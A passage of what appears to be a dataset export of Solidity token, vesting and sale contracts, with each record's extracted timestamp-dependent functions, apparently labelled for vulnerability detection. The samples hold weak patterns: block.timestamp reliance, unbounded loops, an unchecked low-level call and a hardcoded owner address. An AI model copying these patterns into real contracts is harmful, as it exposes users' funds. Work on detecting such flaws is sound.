pendingOwner;\n modifier onlyPendingOwner() {\n require(msg.sender == pendingOwner);\n _;\n }\n function transferOwnership(address newOwner) onlyOwner public {\n pendingOwner = newOwner;\n }\n function claimOwnership() onlyPendingOwner public {\n emit OwnershipTransferred(owner, pendingOwner);\n owner = pendingOwner;\n pendingOwner = address(0);\n }\n}\ncontract Operational is Claimable {\n address public operator;\n function Operational(address _operator) public {\n operator = _operator;\n }\n modifier onlyOperator() {\n require(msg.sender == operator);\n _;\n }\n function transferOperator(address newOperator) public onlyOwner {\n require(newOperator != address(0));\n operator = newOperator;\n }\n}\ncontract YunMint is Operational, ReentrancyGuard, BurnableToken, StandardToken {\n using SafeMath for uint;\n using SafeMath for uint256;\n using DateTime for uint256;\n event Release(address operator, uint256 value, uint256 releaseTime);\n event Burn(address indexed burner, uint256 value);\n event Freeze(address indexed owner, uint256 value, uint256 releaseTime);\n event Unfreeze(address indexed owner, uint256 value, uint256 releaseTime);\n struct FrozenBalance {address owner; uint256 value; uint256 unFrozenTime;}\n mapping (uint => FrozenBalance) public frozenBalances;\n uint public frozenBalanceCount = 0;\n uint256 constant valueTotal = 303000000 * (10 ** 8);\n uint256 public releasedSupply;\n uint public releasedCount = 0;\n uint public cycleCount = 0;\n uint256 public firstReleaseAmount;\n uint256 public curReleaseAmount;\n uint256 public createTime = 0;\n uint256 public lastReleaseTime = 0;\n modifier validAddress(address _address) {\n assert(0x0 != _address);\n _;\n }\n function YunMint(address _operator) public validAddress(_operator) Operational(_operator) {\n createTime = block.timestamp;\n totalSupply_ = valueTotal;\n firstReleaseAmount = 200000 * (10 ** 8);\n }\n function batchTransfer(address[] _to, uint256[] _amount) public returns(bool success) {\n for(uint i = 0; i < _to.length; i++){\n require(transfer(_to[i], _amount[i]));\n }\n return true;\n }\n function release(uint256 timestamp) public onlyOperator returns(bool) {\n require(timestamp <= block.timestamp);\n if(lastReleaseTime > 0){\n require(timestamp > lastReleaseTime);\n }\n require(!hasItBeenReleased(timestamp));\n cycleCount = releasedCount.div(30);\n require(cycleCount < 100);\n require(releasedSupply < valueTotal);\n curReleaseAmount = firstReleaseAmount - (cycleCount * 2000 * (10 ** 8));\n balances[owner] = balances[owner].add(curReleaseAmount);\n releasedSupply = releasedSupply.add(curReleaseAmount);\n lastReleaseTime = timestamp;\n releasedCount = releasedCount + 1;\n emit Release(msg.sender, curReleaseAmount, lastReleaseTime);\n emit Transfer(address(0), owner, curReleaseAmount);\n return true;\n }\n function hasItBeenReleased(uint256 timestamp) internal view returns(bool _exist) {\n bool exist = false;\n if ((lastReleaseTime.parseTimestamp().year == timestamp.parseTimestamp().year)\n && (lastReleaseTime.parseTimestamp().month == timestamp.parseTimestamp().month)\n && (lastReleaseTime.parseTimestamp().day == timestamp.parseTimestamp().day)) {\n exist = true;\n }\n return exist;\n }\n function freeze(uint256 _value, uint256 _unFrozenTime) nonReentrant public returns (bool) {\n require(balances[msg.sender] >= _value);\n require(_unFrozenTime > createTime);\n require(_unFrozenTime > block.timestamp);\n balances[msg.sender] = balances[msg.sender].sub(_value);\n frozenBalances[frozenBalanceCount] = FrozenBalance({owner: msg.sender, value: _value, unFrozenTime: _unFrozenTime});\n frozenBalanceCount++;\n emit Freeze(msg.sender, _value, _unFrozenTime);\n return true;\n }\n function frozenBalanceOf(address _owner) constant public returns (uint256 value) {\n for (uint i = 0; i < frozenBalanceCount; i++) {\n FrozenBalance storage frozenBalance = frozenBalances[i];\n if (_owner == frozenBalance.owner) {\n value = value.add(frozenBalance.value);\n }\n }\n return value;\n }\n function unfreeze() public returns (uint256 releaseAmount) {\n uint index = 0;\n while (index < frozenBalanceCount) {\n if (now >= frozenBalances[index].unFrozenTime) {\n releaseAmount += frozenBalances[index].value;\n unFrozenBalanceByIndex(index);\n } else {\n index++;\n }\n }\n return releaseAmount;\n }\n function unFrozenBalanceByIndex(uint index) internal {\n FrozenBalance storage frozenBalance = frozenBalances[index];\n balances[frozenBalance.owner] = balances[frozenBalance.owner].add(frozenBalance.value);\n emit Unfreeze(frozenBalance.owner, frozenBalance.value, frozenBalance.unFrozenTime);\n frozenBalances[index] = frozenBalances[frozenBalanceCount - 1];\n delete frozenBalances[frozenBalanceCount - 1];\n frozenBalanceCount--;\n }\n}\ncontract YunToken is YunMint {\n string public standard = '2018062301';\n string public name = 'YunToken';\n string public symbol = 'YUN';\n uint8 public decimals = 8;\n function YunToken(address _operator) YunMint(_operator) public {}\n}",
  "extract_feature": [
    "function YunMint(address _operator) public validAddress(_operator) Operational(_operator) {\ncreateTime = block.timestamp;\ntotalSupply_ = valueTotal;\nfirstReleaseAmount = 200000 * (10 ** 8);\n}",
    "function release(uint256 timestamp) public onlyOperator returns(bool) {\nrequire(timestamp <= block.timestamp);\nif(lastReleaseTime > 0){\nrequire(timestamp > lastReleaseTime);\n}\nrequire(!hasItBeenReleased(timestamp));\ncycleCount = releasedCount.div(30);\nrequire(cycleCount < 100);\nrequire(releasedSupply < valueTotal);\ncurReleaseAmount = firstReleaseAmount - (cycleCount * 2000 * (10 ** 8));\nbalances[owner] = balances[owner].add(curReleaseAmount);\nreleasedSupply = releasedSupply.add(curReleaseAmount);\nlastReleaseTime = timestamp;\nreleasedCount = releasedCount + 1;\nemit Release(msg.sender, curReleaseAmount, lastReleaseTime);\nemit Transfer(address(0), owner, curReleaseAmount);\nreturn true;\n}",
    "function freeze(uint256 _value, uint256 _unFrozenTime) nonReentrant public returns (bool) {\nrequire(balances[msg.sender] >= _value);\nrequire(_unFrozenTime > createTime);\nrequire(_unFrozenTime > block.timestamp);\nbalances[msg.sender] = balances[msg.sender].sub(_value);\nfrozenBalances[frozenBalanceCount] = FrozenBalance({owner: msg.sender, value: _value, unFrozenTime: _unFrozenTime});\nfrozenBalanceCount++;\nemit Freeze(msg.sender, _value, _unFrozenTime);\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaabfa0e1460cdfa1f68"
  },
  "filename": "8612.sol",
  "content": "pragma solidity ^0.4.13;\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) public onlyOwner {\n require(newOwner != address(0));\n emit OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\ncontract Claimable is Ownable {\n address public pendingOwner;\n modifier onlyPendingOwner() {\n require(msg.sender == pendingOwner);\n _;\n }\n function transferOwnership(address newOwner) onlyOwner public {\n pendingOwner = newOwner;\n }\n function claimOwnership() onlyPendingOwner public {\n emit OwnershipTransferred(owner, pendingOwner);\n owner = pendingOwner;\n pendingOwner = address(0);\n }\n}\ncontract TokenVestingFactory is Claimable {\n event Created(VariableRateTokenVesting vesting);\n function create(\n address _beneficiary,\n uint256 _start,\n uint256[] _cumulativeRates,\n uint256 _interval\n ) onlyOwner public returns (VariableRateTokenVesting)\n {\n VariableRateTokenVesting vesting = new VariableRateTokenVesting(\n _beneficiary, _start, _cumulativeRates, _interval);\n emit Created(vesting);\n return vesting;\n }\n}\ncontract TokenVesting is Ownable {\n using SafeMath for uint256;\n using SafeERC20 for ERC20Basic;\n event Released(uint256 amount);\n event Revoked();\n address public beneficiary;\n uint256 public cliff;\n uint256 public start;\n uint256 public duration;\n bool public revocable;\n mapping (address => uint256) public released;\n mapping (address => bool) public revoked;\n function TokenVesting(\n address _beneficiary,\n uint256 _start,\n uint256 _cliff,\n uint256 _duration,\n bool _revocable\n )\n public\n {\n require(_beneficiary != address(0));\n require(_cliff <= _duration);\n beneficiary = _beneficiary;\n revocable = _revocable;\n duration = _duration;\n cliff = _start.add(_cliff);\n start = _start;\n }\n function release(ERC20Basic token) public {\n uint256 unreleased = releasableAmount(token);\n require(unreleased > 0);\n released[token] = released[token].add(unreleased);\n token.safeTransfer(beneficiary, unreleased);\n emit Released(unreleased);\n }\n function revoke(ERC20Basic token) public onlyOwner {\n require(revocable);\n require(!revoked[token]);\n uint256 balance = token.balanceOf(this);\n uint256 unreleased = releasableAmount(token);\n uint256 refund = balance.sub(unreleased);\n revoked[token] = true;\n token.safeTransfer(owner, refund);\n emit Revoked();\n }\n function releasableAmount(ERC20Basic token) public view returns (uint256) {\n return vestedAmount(token).sub(released[token]);\n }\n function vestedAmount(ERC20Basic token) public view returns (uint256) {\n uint256 currentBalance = token.balanceOf(this);\n uint256 totalBalance = currentBalance.add(released[token]);\n if (block.timestamp < cliff) {\n return 0;\n } else if (block.timestamp >= start.add(duration) || revoked[token]) {\n return totalBalance;\n } else {\n return totalBalance.mul(block.timestamp.sub(start)).div(duration);\n }\n }\n}\nlibrary SafeERC20 {\n function safeTransfer(ERC20Basic token, address to, uint256 value) internal {\n assert(token.transfer(to, value));\n }\n function safeTransferFrom(\n ERC20 token,\n address from,\n address to,\n uint256 value\n )\n internal\n {\n assert(token.transferFrom(from, to, value));\n }\n function safeApprove(ERC20 token, address spender, uint256 value) internal {\n assert(token.approve(spender, value));\n }\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract VariableRateTokenVesting is TokenVesting {\n using SafeMath for uint256;\n using SafeERC20 for ERC20Basic;\n uint256[] public cumulativeRates;\n uint256 public interval;\n constructor(\n address _beneficiary,\n uint256 _start,\n uint256[] _cumulativeRates,\n uint256 _interval\n ) public\n TokenVesting(_beneficiary, _start, 0, ~uint256(0), true)\n {\n for (uint256 i = 0; i < _cumulativeRates.length; ++i) {\n require(_cumulativeRates[i] <= 100);\n if (i > 0) {\n require(_cumulativeRates[i] >= _cumulativeRates[i - 1]);\n }\n }\n cumulativeRates = _cumulativeRates;\n interval = _interval;\n owner = 0x0298CF0d5B60a0aD885518adCB4c3fc49b36D347;\n }\n function vestedAmount(ERC20Basic token) public view returns (uint256) {\n if (now < start) {\n return 0;\n }\n uint256 currentBalance = token.balanceOf(this);\n uint256 totalBalance = currentBalance.add(released[token]);\n uint256 timeSinceStart = now.sub(start);\n uint256 currentPeriod = timeSinceStart.div(interval);\n if (currentPeriod >= cumulativeRates.length) {\n return totalBalance;\n }\n return totalBalance.mul(cumulativeRates[currentPeriod]).div(100);\n }\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public view returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}",
  "extract_feature": [
    "function vestedAmount(ERC20Basic token) public view returns (uint256) {\nuint256 currentBalance = token.balanceOf(this);\nuint256 totalBalance = currentBalance.add(released[token]);\nif (block.timestamp < cliff) {\nreturn 0;\n} else if (block.timestamp >= start.add(duration) || revoked[token]) {\nreturn totalBalance;\n} else {\nreturn totalBalance.mul(block.timestamp.sub(start)).div(duration);\n}\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaabfa0e1460cdfa1f69"
  },
  "filename": "8615.sol",
  "content": "pragma solidity ^0.4.13;\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) public onlyOwner {\n require(newOwner != address(0));\n emit OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\ncontract Claimable is Ownable {\n address public pendingOwner;\n modifier onlyPendingOwner() {\n require(msg.sender == pendingOwner);\n _;\n }\n function transferOwnership(address newOwner) onlyOwner public {\n pendingOwner = newOwner;\n }\n function claimOwnership() onlyPendingOwner public {\n emit OwnershipTransferred(owner, pendingOwner);\n owner = pendingOwner;\n pendingOwner = address(0);\n }\n}\ncontract TokenVestingFactory is Claimable {\n event Created(VariableRateTokenVesting vesting);\n function create(\n address _beneficiary,\n uint256 _start,\n uint256[] _cumulativeRates,\n uint256 _interval\n ) onlyOwner public returns (VariableRateTokenVesting)\n {\n VariableRateTokenVesting vesting = new VariableRateTokenVesting(\n _beneficiary, _start, _cumulativeRates, _interval);\n emit Created(vesting);\n return vesting;\n }\n}\ncontract TokenVesting is Ownable {\n using SafeMath for uint256;\n using SafeERC20 for ERC20Basic;\n event Released(uint256 amount);\n event Revoked();\n address public beneficiary;\n uint256 public cliff;\n uint256 public start;\n uint256 public duration;\n bool public revocable;\n mapping (address => uint256) public released;\n mapping (address => bool) public revoked;\n function TokenVesting(\n address _beneficiary,\n uint256 _start,\n uint256 _cliff,\n uint256 _duration,\n bool _revocable\n )\n public\n {\n require(_beneficiary != address(0));\n require(_cliff <= _duration);\n beneficiary = _beneficiary;\n revocable = _revocable;\n duration = _duration;\n cliff = _start.add(_cliff);\n start = _start;\n }\n function release(ERC20Basic token) public {\n uint256 unreleased = releasableAmount(token);\n require(unreleased > 0);\n released[token] = released[token].add(unreleased);\n token.safeTransfer(beneficiary, unreleased);\n emit Released(unreleased);\n }\n function revoke(ERC20Basic token) public onlyOwner {\n require(revocable);\n require(!revoked[token]);\n uint256 balance = token.balanceOf(this);\n uint256 unreleased = releasableAmount(token);\n uint256 refund = balance.sub(unreleased);\n revoked[token] = true;\n token.safeTransfer(owner, refund);\n emit Revoked();\n }\n function releasableAmount(ERC20Basic token) public view returns (uint256) {\n return vestedAmount(token).sub(released[token]);\n }\n function vestedAmount(ERC20Basic token) public view returns (uint256) {\n uint256 currentBalance = token.balanceOf(this);\n uint256 totalBalance = currentBalance.add(released[token]);\n if (block.timestamp < cliff) {\n return 0;\n } else if (block.timestamp >= start.add(duration) || revoked[token]) {\n return totalBalance;\n } else {\n return totalBalance.mul(block.timestamp.sub(start)).div(duration);\n }\n }\n}\nlibrary SafeERC20 {\n function safeTransfer(ERC20Basic token, address to, uint256 value) internal {\n assert(token.transfer(to, value));\n }\n function safeTransferFrom(\n ERC20 token,\n address from,\n address to,\n uint256 value\n )\n internal\n {\n assert(token.transferFrom(from, to, value));\n }\n function safeApprove(ERC20 token, address spender, uint256 value) internal {\n assert(token.approve(spender, value));\n }\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract VariableRateTokenVesting is TokenVesting {\n using SafeMath for uint256;\n using SafeERC20 for ERC20Basic;\n uint256[] public cumulativeRates;\n uint256 public interval;\n constructor(\n address _beneficiary,\n uint256 _start,\n uint256[] _cumulativeRates,\n uint256 _interval\n ) public\n TokenVesting(_beneficiary, _start, 0, ~uint256(0), true)\n {\n for (uint256 i = 0; i < _cumulativeRates.length; ++i) {\n require(_cumulativeRates[i] <= 100);\n if (i > 0) {\n require(_cumulativeRates[i] >= _cumulativeRates[i - 1]);\n }\n }\n cumulativeRates = _cumulativeRates;\n interval = _interval;\n owner = 0x0298CF0d5B60a0aD885518adCB4c3fc49b36D347;\n }\n function vestedAmount(ERC20Basic token) public view returns (uint256) {\n if (now < start) {\n return 0;\n }\n uint256 currentBalance = token.balanceOf(this);\n uint256 totalBalance = currentBalance.add(released[token]);\n uint256 timeSinceStart = now.sub(start);\n uint256 currentPeriod = timeSinceStart.div(interval);\n if (currentPeriod >= cumulativeRates.length) {\n return totalBalance;\n }\n return totalBalance.mul(cumulativeRates[currentPeriod]).div(100);\n }\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public view returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}",
  "extract_feature": [
    "function vestedAmount(ERC20Basic token) public view returns (uint256) {\nuint256 currentBalance = token.balanceOf(this);\nuint256 totalBalance = currentBalance.add(released[token]);\nif (block.timestamp < cliff) {\nreturn 0;\n} else if (block.timestamp >= start.add(duration) || revoked[token]) {\nreturn totalBalance;\n} else {\nreturn totalBalance.mul(block.timestamp.sub(start)).div(duration);\n}\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaabfa0e1460cdfa1f6a"
  },
  "filename": "8636.sol",
  "content": "pragma solidity ^0.4.13;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) public onlyOwner {\n require(newOwner != address(0));\n emit OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public view returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\nlibrary SafeERC20 {\n function safeTransfer(ERC20Basic token, address to, uint256 value) internal {\n assert(token.transfer(to, value));\n }\n function safeTransferFrom(\n ERC20 token,\n address from,\n address to,\n uint256 value\n )\n internal\n {\n assert(token.transferFrom(from, to, value));\n }\n function safeApprove(ERC20 token, address spender, uint256 value) internal {\n assert(token.approve(spender, value));\n }\n}\ncontract TokenVesting is Ownable {\n using SafeMath for uint256;\n using SafeERC20 for ERC20Basic;\n event Released(uint256 amount);\n event Revoked();\n address public beneficiary;\n uint256 public cliff;\n uint256 public start;\n uint256 public duration;\n bool public revocable;\n mapping (address => uint256) public released;\n mapping (address => bool) public revoked;\n function TokenVesting(\n address _beneficiary,\n uint256 _start,\n uint256 _cliff,\n uint256 _duration,\n bool _revocable\n )\n public\n {\n require(_beneficiary != address(0));\n require(_cliff <= _duration);\n beneficiary = _beneficiary;\n revocable = _revocable;\n duration = _duration;\n cliff = _start.add(_cliff);\n start = _start;\n }\n function release(ERC20Basic token) public {\n uint256 unreleased = releasableAmount(token);\n require(unreleased > 0);\n released[token] = released[token].add(unreleased);\n token.safeTransfer(beneficiary, unreleased);\n emit Released(unreleased);\n }\n function revoke(ERC20Basic token) public onlyOwner {\n require(revocable);\n require(!revoked[token]);\n uint256 balance = token.balanceOf(this);\n uint256 unreleased = releasableAmount(token);\n uint256 refund = balance.sub(unreleased);\n revoked[token] = true;\n token.safeTransfer(owner, refund);\n emit Revoked();\n }\n function releasableAmount(ERC20Basic token) public view returns (uint256) {\n return vestedAmount(token).sub(released[token]);\n }\n function vestedAmount(ERC20Basic token) public view returns (uint256) {\n uint256 currentBalance = token.balanceOf(this);\n uint256 totalBalance = currentBalance.add(released[token]);\n if (block.timestamp < cliff) {\n return 0;\n } else if (block.timestamp >= start.add(duration) || revoked[token]) {\n return totalBalance;\n } else {\n return totalBalance.mul(block.timestamp.sub(start)).div(duration);\n }\n }\n}\ncontract VariableRateTokenVesting is TokenVesting {\n using SafeMath for uint256;\n using SafeERC20 for ERC20Basic;\n uint256[] public cumulativeRates;\n uint256 public interval;\n constructor(\n address _beneficiary,\n uint256 _start,\n uint256 _cliff,\n uint256[] _cumulativeRates,\n uint256 _interval\n ) public\n TokenVesting(_beneficiary, _start, _cliff, ~uint256(0), true)\n {\n for (uint256 i = 0; i < _cumulativeRates.length; ++i) {\n require(_cumulativeRates[i] <= 100);\n if (i > 0) {\n require(_cumulativeRates[i] >= _cumulativeRates[i - 1]);\n }\n }\n cumulativeRates = _cumulativeRates;\n interval = _interval;\n }\n function vestedAmount(ERC20Basic token) public view returns (uint256) {\n if (now < cliff) {\n return 0;\n }\n uint256 currentBalance = token.balanceOf(this);\n uint256 totalBalance = currentBalance.add(released[token]);\n uint256 timeSinceStart = now.sub(start);\n uint256 currentPeriod = timeSinceStart.div(interval);\n if (currentPeriod >= cumulativeRates.length) {\n return totalBalance;\n }\n return totalBalance.mul(cumulativeRates[currentPeriod]).div(100);\n }\n}",
  "extract_feature": [
    "function vestedAmount(ERC20Basic token) public view returns (uint256) {\nuint256 currentBalance = token.balanceOf(this);\nuint256 totalBalance = currentBalance.add(released[token]);\nif (block.timestamp < cliff) {\nreturn 0;\n} else if (block.timestamp >= start.add(duration) || revoked[token]) {\nreturn totalBalance;\n} else {\nreturn totalBalance.mul(block.timestamp.sub(start)).div(duration);\n}\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaabfa0e1460cdfa1f6b"
  },
  "filename": "8750.sol",
  "content": "pragma solidity ^0.4.23;\nlibrary SafeMath {\n function mul(uint256 _x, uint256 _y) internal pure returns (uint256 z) {\n if (_x == 0) {\n return 0;\n }\n z = _x * _y;\n assert(z / _x == _y);\n return z;\n }\n function div(uint256 _x, uint256 _y) internal pure returns (uint256) {\n return _x / _y;\n }\n function sub(uint256 _x, uint256 _y) internal pure returns (uint256) {\n assert(_y <= _x);\n return _x - _y;\n }\n function add(uint256 _x, uint256 _y) internal pure returns (uint256 z) {\n z = _x + _y;\n assert(z >= _x);\n return z;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed _previousOwner, address indexed _newOwner);\n constructor() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address _newOwner) onlyOwner public {\n require(_newOwner != address(0));\n owner = _newOwner;\n emit OwnershipTransferred(owner, _newOwner);\n }\n}\ncontract Erc20Wrapper {\n function totalSupply() public view returns (uint256);\n function balanceOf(address _who) public view returns (uint256);\n function transfer(address _to, uint256 _value) public returns (bool);\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool);\n function approve(address _spender, uint256 _value) public returns (bool);\n function allowance(address _owner, address _spender) public view returns (uint256);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract LemurTokenSale is Ownable {\n using SafeMath for uint256;\n Erc20Wrapper public token;\n address public wallet;\n uint256 public rate;\n uint256 public amountRaised;\n uint256 public openingTime;\n uint256 public closingTime;\n event TokenPurchase(address indexed _purchaser, address indexed _beneficiary, uint256 _value, uint256 _amount);\n constructor() public {\n openingTime = block.timestamp;\n closingTime = openingTime.add(90 days);\n }\n function setToken(Erc20Wrapper _token) onlyOwner public {\n require(_token != address(0));\n token = _token;\n }\n function setWallet(address _wallet) onlyOwner public {\n require(_wallet != address(0));\n wallet = _wallet;\n }\n function setRate(uint256 _rate) onlyOwner public {\n require(_rate > 0);\n rate = _rate;\n }\n function setClosingTime(uint256 _days) onlyOwner public {\n require(_days >= 1);\n closingTime = openingTime.add(_days.mul(1 days));\n }\n function hasClosed() public view returns (bool) {\n return block.timestamp > closingTime;\n }\n function () external payable {\n buyTokens(msg.sender);\n }\n function buyTokens(address _beneficiary) public payable {\n require(!hasClosed());\n require(token != address(0) && wallet != address(0) && rate > 0);\n require(_beneficiary != address(0));\n uint256 amount = msg.value;\n require(amount >= 0.01 ether);\n uint256 tokenAmount = amount.mul(rate);\n amountRaised = amountRaised.add(amount);\n require(token.transfer(_beneficiary, tokenAmount));\n emit TokenPurchase(msg.sender, _beneficiary, amount, tokenAmount);\n wallet.transfer(amount);\n }\n}",
  "extract_feature": [
    "function hasClosed() public view returns (bool) {\nreturn block.timestamp > closingTime;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaabfa0e1460cdfa1f6c"
  },
  "filename": "8766.sol",
  "content": "pragma solidity ^0.4.24;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n constructor() internal {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) public onlyOwner {\n require(newOwner != address(0));\n emit OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\ncontract TokenCHK {\n function balanceOf(address _owner) public pure returns (uint256 balance) {}\n}\ncontract ESSENTIA_PE is Ownable {\n using SafeMath for uint256;\n string public name = \"ESSENTIA Public Engagement\";\n uint256 public tokenPrice = 0;\n uint256 public maxCap = 0;\n address public FWDaddrETH;\n address public ESSgenesis;\n uint256 public totalSold;\n uint256 public decimals = 18;\n mapping (address => uint256) public sold;\n uint256 public pubEnd = 0;\n address contractAddr=this;\n uint256 public tokenUnit = uint256(10)**decimals;\n constructor\n (\n address toETHaddr,\n address addrESSgenesis\n ) public {\n FWDaddrETH = toETHaddr;\n ESSgenesis = addrESSgenesis;\n }\n function () public payable {\n buy();\n }\n function setFWDaddrETH(address _value) public onlyOwner{\n FWDaddrETH=_value;\n }\n function setGenesis(address _value) public onlyOwner{\n ESSgenesis=_value;\n }\n function setMaxCap(uint256 _value) public onlyOwner{\n maxCap=_value;\n }\n function setPrice(uint256 _value) public onlyOwner{\n tokenPrice=_value;\n }\n function setPubEnd(uint256 _value) public onlyOwner{\n pubEnd=_value;\n }\n function buy() public payable {\n require(block.timestamp < pubEnd);\n require(msg.value > 0);\n require(msg.value <= msg.sender.balance);\n require(msg.value + totalSold <= maxCap);\n uint256 tokenAmount = (msg.value * tokenUnit) / tokenPrice;\n require(tokenAmount<=TokenCHK(ESSgenesis).balanceOf(contractAddr));\n transferBuy(msg.sender, tokenAmount);\n totalSold = totalSold.add(msg.value);\n FWDaddrETH.transfer(msg.value);\n }\n function withdrawPUB() public returns(bool){\n require(block.timestamp > pubEnd);\n require(sold[msg.sender] > 0);\n if(!ESSgenesis.call(bytes4(keccak256(\"transfer(address,uint256)\")), msg.sender, sold[msg.sender])){revert();}\n delete sold[msg.sender];\n return true;\n }\n function transferBuy(address _to, uint256 _value) internal returns (bool) {\n require(_to != address(0));\n sold[_to]=sold[_to].add(_value);\n return true;\n }\n function EMGwithdraw(uint256 weiValue) external onlyOwner {\n require(block.timestamp > pubEnd);\n require(weiValue > 0);\n FWDaddrETH.transfer(weiValue);\n }\n}",
  "extract_feature": [
    "function buy() public payable {\nrequire(block.timestamp < pubEnd);\nrequire(msg.value > 0);\nrequire(msg.value <= msg.sender.balance);\nrequire(msg.value + totalSold <= maxCap);\nuint256 tokenAmount = (msg.value * tokenUnit) / tokenPrice;\nrequire(tokenAmount<=TokenCHK(ESSgenesis).balanceOf(contractAddr));\ntransferBuy(msg.sender, tokenAmount);\ntotalSold = totalSold.add(msg.value);\nFWDaddrETH.transfer(msg.value);\n}",
    "function withdrawPUB() public returns(bool){\nrequire(block.timestamp > pubEnd);\nrequire(sold[msg.sender] > 0);\nif(!ESSgenesis.call(bytes4(keccak256(\"transfer(address,uint256)\")), msg.sender, sold[msg.sender])){revert();}\ndelete sold[msg.sender];\nreturn true;\n}",
    "function EMGwithdraw(uint256 weiValue) external onlyOwner {\nrequire(block.timestamp > pubEnd);\nrequire(weiValue > 0);\nFWDaddrETH.transfer(weiValue);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaabfa0e1460cdfa1f6d"
  },
  "filename": "8826.sol",
